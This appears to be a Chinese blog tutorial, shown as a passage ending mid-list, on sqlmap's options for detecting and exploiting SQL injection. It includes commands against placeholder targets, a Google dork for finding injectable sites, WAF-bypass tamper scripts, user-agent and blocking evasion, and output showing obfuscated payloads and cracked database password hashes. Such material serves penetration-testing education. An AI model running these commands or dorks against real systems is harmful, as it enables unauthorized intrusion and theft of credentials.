+<p><img src="https://img.npfs06.top/20210326210431.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h1 id="设置显示信息的详细度："><a href="#设置显示信息的详细度：" class="headerlink" title="设置显示信息的详细度："></a>设置显示信息的详细度：</h1><p>使用<code>-v</code>参数，共有<code>七</code>个等级：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">0.</span> 只显示python错误以及严重的信息。</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 同时显示基本信息和警告信息。（默认）</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> 同时显示debug信息。</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> 同时显示注入的payload。</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 同时显示HTTP请求。</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> 同时显示HTTP响应头。</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> 同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>
+<p>可以通过学习<code>sqlmap</code>的<code>payload</code>来学习<code>sql</code>注入，这时需要使用3级。</p>
+<h1 id="获取目标方式"><a href="#获取目标方式" class="headerlink" title="获取目标方式"></a>获取目标方式</h1><p><strong>目标URL</strong></p>
+<p>参数：<code>-u</code>或者<code>–url</code></p>
+<p>格式：<code>http(s)://targeturl[:port]/[…]</code></p>
+<p>例如：<code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users</code></p>
+<p>从<code>Burp</code>或者<code>WebScarab</code>代理中获取日志</p>
+<p>参数：<code>-l</code></p>
+<p>可以直接吧<code>Burp proxy</code>或者<code>WebScarab proxy</code>中的日志直接倒出来交给<code>sqlmap</code>来一个一个检测是否有注入。</p>
+<p><strong>从文本中获取多个目标扫描</strong></p>
+<p>参数：<code>-m</code></p>
+<p>文件中保存<code>url</code>格式如下，<code>sqlmap</code>会一个一个检测</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">www</span>.target<span class="number">1</span>.com/vuln<span class="number">1</span>.php?q=foobar</span><br><span class="line"></span><br><span class="line"><span class="attribute">www</span>.target<span class="number">2</span>.com/vuln<span class="number">2</span>.asp?id=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">www</span>.target<span class="number">3</span>.com/vuln<span class="number">3</span>/id/<span class="number">1</span>*</span><br></pre></td></tr></table></figure>
+<p><strong>从文件中加载HTTP请求</strong></p>
+<p>参数：<code>-r</code></p>
+<p><code>sqlmap</code>可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数（比如<code>cookie，POST</code>数据，等等）。</p>
+<p>比如文本文件内如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vuln.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.target.com</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
+<p>当请求是HTTPS的时候你需要配合这个<code>–force-ssl</code>参数来使用，或者你可以在Host头后面加上:<code>443</code></p>
+<p><strong>处理Google的搜索结果</strong></p>
+<p>参数：<code>-g</code></p>
+<p><code>sqlmap</code>可以测试注入<code>Google</code>的搜索结果中的<code>GET</code>参数（只获取前<code>100</code>个结果）。</p>
+<p>例子：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -g <span class="string">&quot;inurl:<span class="subst">\&quot;</span>.php?id=1<span class="subst">\&quot;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p>
+<h1 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h1><p><strong>http数据</strong></p>
+<p>参数：<code>–data</code></p>
+<p>此参数是把数据以<code>POST</code>方式提交，<code>sqlmap</code>会像检测GET参数一样检测<code>POST</code>的参数。</p>
+<p>例子：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.target.com/vuln.php&quot;</span> <span class="params">--data=</span><span class="string">&quot;id=1&quot;</span> -f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span></span><br></pre></td></tr></table></figure>
+<p><strong>参数拆分字符</strong></p>
+<p>参数：<code>–param-del</code></p>
+<p>当<code>GET</code>或<code>POST</code>的数据需要用其他字符分割测试参数的时候需要用到此参数（默认是&amp;）。</p>
+<p>例子：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.target.com/vuln.php&quot;</span> <span class="params">--data=</span><span class="string">&quot;query=foobar;id=1&quot;</span></span><br><span class="line"><span class="params">--param-del=</span><span class="string">&quot;;&quot;</span> -f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span></span><br></pre></td></tr></table></figure>
+<p><strong>HTTP cookie头</strong></p>
+<p>参数：<code>–cookie,–load-cookies,–drop-set-cookie</code></p>
+<p>这个参数在以下两个方面很有用：</p>
+<ol>
+<li>web应用需要登陆的时候。</li>
+<li>你想要在这些头参数中测试SQL注入时。</li>
+</ol>
+<p>可以通过抓包把<code>cookie</code>获取到，复制出来，然后加到<code>–cookie</code>参数里。</p>
+<p>在<code>HTTP</code>请求中，遇到<code>Set-Cookie</code>的话，<code>sqlmap</code>会自动获取并且在以后的请求中加入，并且会尝试<code>SQL</code>注入。</p>
+<p>如果你不想接受<code>Set-Cookie</code>可以使用<code>–drop-set-cookie</code>参数来拒接。</p>
+<p>当你使用<code>–cookie</code>参数时，当返回一个<code>Set-Cookie</code>头的时候，<code>sqlmap</code>会询问你用哪个<code>cookie</code>来继续接下来的请求。</p>
+<p>当<code>–level</code>的参数设定为2或者2以上的时候，<code>sqlmap</code>会尝试注入<code>Cookie</code>参数。</p>
+<p><strong>HTTP User-Agent头</strong></p>
+<p>参数：<code>–user-agent,–random-agent</code></p>
+<p>默认情况下<code>sqlmap</code>的<code>HTTP</code>请求头中<code>User-Agen</code>t值是：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span>/<span class="number">1</span>.<span class="number">0</span>-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure>
+<p>（这可能直接会被过滤掉或是触发警报，可以使用真实浏览器的<code>useragent</code>，百度一下就有了）</p>
+<p>可以使用<code>–user-anget</code>参数来修改，同时也可以使用<code>–random-agnet</code>参数来随机的从<code>./txt/user-agents.txt</code>中获取。</p>
+<p>当<code>–level</code>参数设定为3或者3以上的时候，会尝试对<code>User-Angent</code>进行注入。</p>
+<p><strong>HTTP Referer头</strong></p>
+<p>参数：<code>–referer</code></p>
+<p><code>sqlmap</code>可以在请求中伪造HTTP中的<code>referer</code>，当<code>–level</code>参数设定为3或者3以上的时候会尝试对referer注入。</p>
+<p><strong>额外的HTTP头</strong></p>
+<p>参数：<code>–headers</code></p>
+<p>可以通过<code>–headers</code>参数来增加额外的http头</p>
+<p><strong>HTTP认证保护</strong></p>
+<p>参数：<code>–auth-type,–auth-cred</code></p>
+<p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Basic</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> Digest</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> NTLM</span><br></pre></td></tr></table></figure>
+<p>例子：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span></span><br><span class="line">--auth-<span class="built_in">type</span> Basic --auth-cred <span class="string">&quot;testuser:testpass&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>HTTP协议的证书认证</strong></p>
+<p>参数：<code>–auth-cert</code></p>
+<p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:<code>key_file，cert_file</code>。</p>
+<p><code>key_file</code>是格式为PEM文件，包含着你的私钥，<code>cert_file</code>是格式为<code>PEM</code>的连接文件。</p>
+<p><strong>HTTP(S)代理</strong></p>
+<p>参数：<code>–proxy,–proxy-cred</code>和<code>–ignore-proxy</code></p>
+<p>使用<code>–proxy</code>代理是格式为：<code>http://url:port。</code></p>
+<p>当<code>HTTP(S)</code>代理需要认证是可以使用<code>–proxy-cred</code>参数：<code>username:password</code>。</p>
+<p><code>–ignore-proxy</code>拒绝使用本地局域网的<code>HTTP(S)</code>代理。</p>
+<p><strong>HTTP请求延迟</strong></p>
+<p>参数：<code>–delay</code></p>
+<p>可以设定两个<code>HTTP(S)</code>请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+<p><strong>设定超时时间</strong></p>
+<p>参数：<code>–timeout</code></p>
+<p>可以设定一个<code>HTTP(S)</code>请求超过多久判定为超时，<code>10.5</code>表示<code>10.5</code>秒，默认是<code>30</code>秒。</p>
+<p><strong>设定重试超时</strong></p>
+<p>参数：<code>–retries</code></p>
+<p>当<code>HTTP(S)</code>超时时，可以设定重新尝试连接次数，默认是3次。</p>
+<p><strong>设定随机改变的参数值</strong></p>
+<p>参数：<code>–randomize</code></p>
+<p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p>
+<p>利用正则过滤目标网址</p>
+<p>参数：<code>**–scope**</code></p>
+<p>例如：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -l burp.log --scope=&quot;(www)?<span class="symbol">\.</span>target<span class="symbol">\.</span>(com<span class="symbol">\|</span>net<span class="symbol">\|</span>org)&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>避免过多的错误请求被屏蔽</strong></p>
+<p>参数：<code>–safe-url,–safe-freq</code></p>
+<p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
+<p><strong>绕过这个策略有两种方式：</strong></p>
+<ol>
+<li><code>--safe-url</code>：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li>
+<li><code>--safe-freq</code>：提供一个安全不错误的连接，一段频率后会访问一次。</li>
+</ol>
+<p><strong>关掉URL参数值编码</strong></p>
+<p>参数：<code>–skip-urlencode</code></p>
+<p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过<code>URL</code>编码的值，这时候就需要用<code>–skip-urlencode</code>参数。</p>
+<p><strong>每次请求时候执行自定义的python代码</strong></p>
+<p>参数：<code>–eval</code></p>
+<p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p>
+<p>例子：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span></span><br><span class="line"><span class="string">&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;</span></span><br><span class="line">--<span class="built_in">eval</span>=<span class="string">&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span></span><br></pre></td></tr></table></figure>
+<p>上面的请求就是每次请求时根据id参数值，做一次<code>md5</code>后作为<code>hash</code>参数的值。</p>
+<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p><strong>测试参数</strong></p>
+<p>参数：<code>-p</code></p>
+<p>如： <code>-p “id,user-anget”</code></p>
+<p><strong>指定要跳过测试的参数</strong></p>
+<p>参数：<code>–skip</code></p>
+<p>如：<code>–skip=”user-angent.referer”</code></p>
+<p>对于伪静态链接，可以在想测试的参数后面加*，它会测试那个指定的参数</p>
+<p>例如：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://targeturl/param1/value1\*/param2/value2/&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>指定数据库</strong></p>
+<p>参数：<code>–dbms</code></p>
+<p>不指定会自动探测，如果知道最好指定</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL、Oracle、PostgreSQL、Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>、Microsoft</span><br><span class="line"><span class="keyword">Access</span>、SQLite、Firebird、Sybase、SAP MaxDB、DB2</span><br></pre></td></tr></table></figure>
+<p><strong>指定服务器系统</strong></p>
+<p>参数：<code>–os</code></p>
+<p>不指定会自动探测，支持的有：<code>Linux、Windows</code>。</p>
+<p><strong>指定无效的大数字</strong></p>
+<p>参数：<code>–invalid-bignum</code></p>
+<p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系<code>id=13，sqlmap</code>会变成<code>id=-13</code>来报错，你可以指定比如<code>id=9999999</code>来报错。</p>
+<p><strong>指定无效的逻辑</strong></p>
+<p>参数：<code>–invalid-logical</code></p>
+<p>原因同上，可以指定<code>id=13</code>把原来的<code>id=-13</code>的报错改成<code>id=13 AND 18=19</code>。</p>
+<p><strong>注入payload</strong></p>
+<p>参数：<code>–prefix,–suffix</code></p>
+<p>在有些环境中，需要在注入的<code>payload</code>的前面或者后面加一些字符，来保证<code>payload</code>的正常执行。</p>
+<p>例如，代码中是这样调用数据库的：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=(’<span class="string">&quot; . $_GET[’id’] . &quot;</span>’) <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+<p>这时你就需要<code>–prefix</code>和<code>–suffix</code>参数了：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p <span class="built_in">id</span> <span class="comment">--prefix</span></span><br><span class="line"><span class="string">&quot;’)&quot;</span> <span class="comment">--suffix &quot;AND (’abc’=’abc&quot;</span></span><br></pre></td></tr></table></figure>
+<p>这样执行的SQL语句变成：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=(’<span class="number">1</span>’) &lt;PAYLOAD&gt; <span class="keyword">AND</span> (’abc’=’abc’)</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+<p><strong>修改注入的数据</strong></p>
+<p>参数：<code>–tamper</code></p>
+<p><code>sqlmap</code>除了使用<code>CHAR()</code>函数来防止出现单引号之外没有对注入的数据修改，你可以使用<code>–tamper</code>参数对数据做修改来绕过WAF等设备。<br>下面是一个<code>tamper</code>脚本的格式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Needed imports</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="comment"># Define which is the order of application of tamper scripts against</span></span><br><span class="line"><span class="comment"># the payload</span></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload</span>):</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Description of your tamper script</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">retVal = payload</span><br><span class="line"><span class="comment"># your code to tamper the original payload</span></span><br><span class="line"><span class="comment"># return the tampered payload</span></span><br><span class="line"><span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+<p>可以查看 <code>tamper/</code> 目录下的有哪些可用的脚本</p>
+<p>例如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br><span class="line"></span><br><span class="line">[hh:mm:03] [<span class="builtin-name">DEBUG</span>] cleaning up configuration parameters</span><br><span class="line">[hh:mm:03] [<span class="builtin-name">INFO</span>] loading tamper<span class="built_in"> script </span><span class="string">&#x27;between&#x27;</span></span><br><span class="line">[hh:mm:03] [<span class="builtin-name">INFO</span>] loading tamper<span class="built_in"> script </span><span class="string">&#x27;randomcase&#x27;</span></span><br><span class="line">[hh:mm:03] [<span class="builtin-name">INFO</span>] loading tamper<span class="built_in"> script </span><span class="string">&#x27;space2comment&#x27;</span></span><br><span class="line">[<span class="built_in">..</span>.]</span><br><span class="line">[hh:mm:04] [<span class="builtin-name">INFO</span>] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/<span class="keyword">And</span>/**/<span class="attribute">1369</span>=7706/**/And/**/(4092=4092</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/<span class="keyword">AND</span>/**/<span class="attribute">9267</span>=9267/**/AND/**/(4057=4057</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/<span class="keyword">AnD</span>/**/<span class="attribute">950</span>=7041</span><br><span class="line">[<span class="built_in">..</span>.]</span><br><span class="line">[hh:mm:04] [<span class="builtin-name">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/<span class="keyword">anD</span>/**/(SELeCt/**/9921/**/<span class="keyword">fROm</span>(SELeCt/**/counT(*),CONCAT(cHar(</span><br><span class="line">58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(<span class="attribute">9921</span>=9921)/**/THeN/**/1/**/elsE/**/0/**/</span><br><span class="line">ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)<span class="number">*2</span>))x/**/<span class="keyword">fROm</span>/**/information_schema.tables/**/</span><br><span class="line">group/**/bY/**/x)a)</span><br><span class="line">[hh:mm:04] [<span class="builtin-name">INFO</span>] <span class="builtin-name">GET</span> parameter <span class="string">&#x27;id&#x27;</span> is <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING</span></span><br><span class="line"><span class="string">clause&#x27;</span> injectable</span><br><span class="line">[<span class="built_in">..</span>.]</span><br></pre></td></tr></table></figure>
+<h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p><strong>探测等级</strong></p>
+<p>参数：<code>–level</code></p>
+<p>共有五个等级，默认为<code>1，sqlmap</code>使用的<code>payload</code>可以在<code>xml/payloads.xml</code>中看到，你也可以根据相应的格式添加自己的<code>payload</code>。</p>
+<p>这个参数不仅影响使用哪些<code>payload</code>同时也会影响测试的注入点，<code>GET</code>和<code>POST</code>的数据都会测试，<code>HTTP Cookie</code>在<code>level</code>为2的时候</p>
+<p>就会测试，<code>HTTP User-Agent/Referer</code>头在<code>level</code>为3的时候就会测试。</p>
+<p>总之在你不确定哪个<code>payload</code>或者参数为注入点的时候，为了保证全面性，建议使用高的<code>level</code>值。</p>
+<p><strong>风险等级</strong></p>
+<p>参数：<code>–risk</code></p>
+<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
+<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
+<p>测试的语句同样可以在<code>xml/payloads.xml</code>中找到，你也可以自行添加<code>payload</code>。</p>
+<p><strong>页面比较</strong></p>
+<p>参数：<code>–string,–not-string,–regexp,–code</code></p>
+<p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，</p>
+<p>比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，</p>
+<p>在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），</p>
+<p>同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。</p>
+<p>用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。</p>
+<p>参数：<code>–text-only,–titles</code></p>
+<p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p>
+<h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><p><strong>测试是否是注入</strong></p>
+<p>参数：<code>–technique</code></p>
+<p>这个参数可以指定<code>sqlmap</code>使用的探测技术，默认情况下会测试所有的方式。</p>
+<p>支持的探测方式如下：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">B: <span class="type">Boolean</span>-based blind <span class="keyword">SQL</span> injection（布尔型注入）</span><br><span class="line"></span><br><span class="line">E: Error-based <span class="keyword">SQL</span> injection（报错型注入）</span><br><span class="line"></span><br><span class="line">U: <span class="keyword">UNION</span> query <span class="keyword">SQL</span> injection（可联合查询注入）</span><br><span class="line"></span><br><span class="line">S: <span class="keyword">Stacked</span> queries <span class="keyword">SQL</span> injection（可多语句查询注入）</span><br><span class="line"></span><br><span class="line">T: <span class="type">Time</span>-based blind <span class="keyword">SQL</span> injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>
+<p><strong>设定延迟注入的时间</strong></p>
+<p>参数：<code>–time-sec</code></p>
+<p>当使用继续时间的盲注时，时刻使用<code>–time-sec</code>参数设定延时时间，默认是5秒。</p>
+<p><strong>设定UNION查询字段数</strong></p>
+<p>参数：<code>–union-cols</code></p>
+<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。</p>
+<p>设定<code>–union-cols</code>的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
+<p><strong>设定UNION查询使用的字符</strong></p>
+<p>参数：<code>–union-char</code></p>
+<p>默认情况下<code>sqlmap</code>针对<code>UNION</code>查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，</p>
+<p>这是你可以用<code>–union-char</code>只定UNION查询的字符。</p>
+<p><strong>二阶SQL注入</strong></p>
+<p>参数：<code>–second-order</code></p>
+<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p>
+<p><code>–second-order</code>后面跟一个判断页面的URL地址。</p>
+<p><strong>列数据</strong></p>
+<p>参数：<code>-b,–banner</code></p>
+<p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>
+<p><strong>用户</strong></p>
+<p>参数：<code>-current-user</code></p>
+<p>在大多数据库中可以获取到管理数据的用户。</p>
+<p><strong>当前数据库</strong></p>
+<p>参数：<code>–current-db</code></p>
+<p>返还当前连接的数据库。</p>
+<p><strong>当前用户是否为管理用</strong></p>
+<p>参数：<code>–is-dba</code></p>
+<p>判断当前的用户是否为管理，是的话会返回True。</p>
+<p><strong>列数据库管理用户</strong></p>
+<p>参数：<code>–users</code></p>
+<p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
+<p><strong>列出并破解数据库用户的hash</strong></p>
+<p>参数：<code>–passwords</code></p>
+<p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://********/sqlmap/pgsql/get_int.php?id=1&quot;</span> --passwords -v <span class="number">1</span></span><br><span class="line">[...]</span><br><span class="line">back-end <span class="symbol">DBMS</span>: <span class="symbol">PostgreSQL</span></span><br><span class="line">[hh:mm:<span class="number">38</span>] [<span class="symbol">INFO</span>] fetching database users password hashes</span><br><span class="line">do you want to use dictionary attack on retrieved password hashes? [<span class="symbol">Y</span>/n/q] y</span><br><span class="line">[hh:mm:<span class="number">42</span>] [<span class="symbol">INFO</span>] using hash method: <span class="string">&#x27;postgres_passwd&#x27;</span></span><br><span class="line">what<span class="string">&#x27;s the dictionary&#x27;</span>s location? [/software/sqlmap/txt/wordlist.txt]</span><br><span class="line">[hh:mm:<span class="number">46</span>] [<span class="symbol">INFO</span>] loading dictionary from: <span class="string">&#x27;/software/sqlmap/txt/wordlist.txt&#x27;</span></span><br><span class="line">do you want to use common password suffixes? (slow!) [y/<span class="symbol">N</span>] n</span><br><span class="line">[hh:mm:<span class="number">48</span>] [<span class="symbol">INFO</span>] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:<span class="number">49</span>] [<span class="symbol">INFO</span>] found: <span class="string">&#x27;testpass&#x27;</span> for user: <span class="string">&#x27;testuser&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [<span class="symbol">INFO</span>] found: <span class="string">&#x27;testpass&#x27;</span> for user: <span class="string">&#x27;postgres&#x27;</span></span><br><span class="line">database management system users password hashes:</span><br><span class="line">[*] postgres [<span class="number">1</span>]:</span><br><span class="line">password hash: md5d7d880f96044b72d0bba108ace96d1e4</span><br><span class="line">clear-text password: testpass</span><br><span class="line">[*] testuser [<span class="number">1</span>]:</span><br><span class="line">password hash: md599e5ea7a6f7c3269995cba3927fd0093</span><br><span class="line">clear-text password: testpass</span><br></pre></td></tr></table></figure>
+<p>可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，</p>
+<p>这个爆破已经支持<code>Oracle</code>和<code>Microsoft SQL Server</code>。</p>
+<p>也可以提供-U参数来指定爆破哪个用户的<code>hash</code>。</p>
+<p><strong>列出数据库管理员权限</strong></p>
+<p>参数：<code>–privileges</code></p>
